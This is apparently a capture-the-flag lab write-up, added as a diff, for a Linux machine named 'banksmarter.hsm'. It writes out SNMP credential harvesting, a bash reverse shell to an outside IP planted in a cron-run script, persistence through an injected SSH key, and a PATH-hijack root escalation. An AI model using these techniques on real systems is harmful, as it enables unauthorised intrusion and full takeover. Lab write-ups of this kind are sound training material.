@@ -1,1 +1,223 @@
+=  Machine Write-Up
+
+Author: Colosion
+OS: Linux
+Level: hard for me
+
+:toc:
+:toclevels: 3
+
+== Table of Contents
+- <<overview,Overview>>
+- <<enumeration,Enumeration>>
+- <<ad-enum,Lateral movement>>
+- <<ad-access,Post-exploatation>>
+- <<privesc,Privilege Escalation>>
+- <<notes,Final Notes>>
+
+[[overview]]
+== Overview
+
+Added to `/etc/hosts` 
+
+[sourse]
+----
+10.1.109.252 banksmarter.hsm
+----
+
+
+
+
+[[enumeration]]
+== Enumeration
+
+*TCP* ports
+
+[sourse]
+----
+kali ~ $ nmap --top-ports 1000 -sC -sV 10.1.109.252                          
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 35:91:78:06:fb:ee:a4:5d:17:f6:bb:bb:c6:9f:3f:25 (ECDSA)
+|_  256 f5:32:bd:30:37:7a:e4:ba:e8:92:49:55:c9:d7:c5:8f (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+----
+
+*UDP* ports
+
+[sourse]
+----
+nmap --top-ports 100 -sU  -sC -sV 10.1.109.252   
+PORT    STATE         SERVICE VERSION
+68/udp  open|filtered dhcpc
+161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+----
+
+`SNMP` service is running -> check by tool `snmpwalk`
+
+[sourse]
+----
+snmpwalk -v 1 -c public 10.1.109.252
+----
+
+`iso.3.6.1.2.1.1.4.0 = STRING: "\"Admin Layne.Stanley:5t6^jahTRjab'\""`
+
+It's can be creds
+
+After several attempts log in to `ssh` like user `layne.stanley`  :  `5t6^jahTRjab`
+
+[sourse]
+----
+kali ~ $ ssh layne.stanley@10.1.109.252
+layne.stanley@10.1.109.252's password: 
+Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1012-aws x86_64)
+----
+
+`user.txt /home/layne.stanley` 
+
+[[ad-enum]]
+== Lateral movement
+
+Anouther users: `ronnie.stone`  `scott.weiland`
+
+Enumerated a script
+
+[sourse]
+----
+layne.stanley@ip-10-1-109-252:~$ ls -la bankSmarter_backup.sh 
+-rwxr-xr-x 1 scott.weiland scott.weiland 2937 Sep 12 12:47 bankSmarter_backup.sh
+----
+
+As user `layne.stanley` can read and execute script
+
+Installing to the machine tool `pspy64` to look some cronjobs without `sudo` perms 
+
+[sourse]
+----
+2025/11/17 17:09:01 CMD: UID=1002  PID=26734  | /bin/sh -c bash /home/layne.stanley/bankSmarter_backup.sh 
+----
+
+So user with id `1002` run script as sheldured task
+
+Looking at `/etc/passwd` gives that user with id `1002` is `scott.weiland` so *Possible* attack path is to escalate privileges to this user by this `script`.I was a little bit confused when i could not replace it with `mv bankSmarter_backup.sh ../` so i stuck in it but after i create a new directory `mkdir script` and move old script to this directory
+
+A new script creation
+
+[sourse]
+----
+nano bankSmarter_backup.sh
+----
+
+Into `script`
+
+[sourse]
+----
+#!/usr/bin/env bash
+
+# bank_maintenance.sh
+
+bash -i >& /dev/tcp/10.200.20.98/9001 0>&1
+----
+
+And start listener by 
+
+[sourse]
+----
+rlwrap nc -lvnp  9001
+----
+
+Logged in as user `scott.weiland`
+
+
+[[ad-access]]
+== Post-exploatation
+
+So reverse shell is reached but we not in `ssh` and could not run `sudo` or other commands so now main goal is to log in in `ssh`. User `scott.weiland` does not have any ssh keys in `./ssh` directory but i can create one for him
+
+Creating a new `ssh` key by `ssh-keygen` and named as id_hack and id_hack.pub.Create a new directory in `scott.weiland` `/home` named `.ssh` add generated in local machine key by `echo "ssh-ed25519 AA ..." > authorized_keys'
+
+[sourse]
+----
+ssh scott.weiland@10.1.109.252 -i id_hack
+----
+
+*Got it.*
+
+[sourse]
+----
+scott.weiland@ip-10-1-109-252:/tmp$ id
+uid=1002(scott.weiland) gid=1002(scott.weiland) groups=1002(scott.weiland),1003(ronnie.stone),1005(tmuxshare),1006(tmuxusers),1007(tmuxshared),1008(bank-team)
+----
+
+
+By enumeration in `home` directory exists file `.bash_history` and open this and user `scott.weiland` runned a various commands if we run a command below
+
+[sourse]
+----
+socat stdio unix-connect:/opt/bank/sockets/live.sock
+----
+
+Successfully logged in as user `ronnie.stone`
+
+
+[[privesc]]
+== Privilege Escalation
+So now from `ronnie.stone` -> 'root'
+
+Find files which can run everyone who exists in group `bankers`
+
+[sourse]
+----
+find / -group bankers 2>/dev/null 
+/usr/local/bin/bank_backupd
+----
+
+[sourse]
+----
+ls -la /usr/local/bin/bank_backupd
+-rwsr-x--- 1 root bankers 16192 Sep 12 13:23 /usr/local/bin/bank_backupd
+----
+
+So owner is `root` but execute and read privileges have a `bankers` group
+
+[sourse]
+----
+ronnie.stone@ip-10-1-224-115:~$ /usr/local/bin/bank_backupd --help
+[bank_backupd] Starting backup for BankSmarter accounts...
+[bank_backupd] Connecting to central ledger...
+[bank_backupd] Verifying transaction logs...
+[bank_backup.py] Running internal Python verification...
+[bank_backup.py] Hashing account transactions...
+86d9050926fde112924e2f71ea8d17b88d90068f39c9907bb3932c2df3c46dfc
+[bank_backup.py] Backup completed successfully.
+----
+
+Exists some new file `bank_backup.py` by opening it i saw this line `#!/usr/bin/env python3` there is not configured full path to python3 and it's possible to PATH Hijack so now `main goal` is create a new `python3` file and run `/usr/local/bin/bank_backupd` with malicious temponaty `path`
+
+[sourse]
+----
+cd /tmp
+echo '#!/bin/bash' > python3 
+echo '/bin/bash -p' >> python3
+chmod +x python3 
+----
+
+Run a `/usr/local/bin/bank_backupd` with temponary `PATH`
+
+[sourse]
+----
+ronnie.stone@ip-10-1-224-115:/tmp$ PATH=/tmp:$PATH /usr/local/bin/bank_backupd 
+[bank_backupd] Starting backup for BankSmarter accounts...
+[bank_backupd] Connecting to central ledger...
+[bank_backupd] Verifying transaction logs...
+root@ip-10-1-224-115:/tmp# cat /root/root.txt
+----
+
+
+
+
+[[notes]]
+== Final Notes
+
 
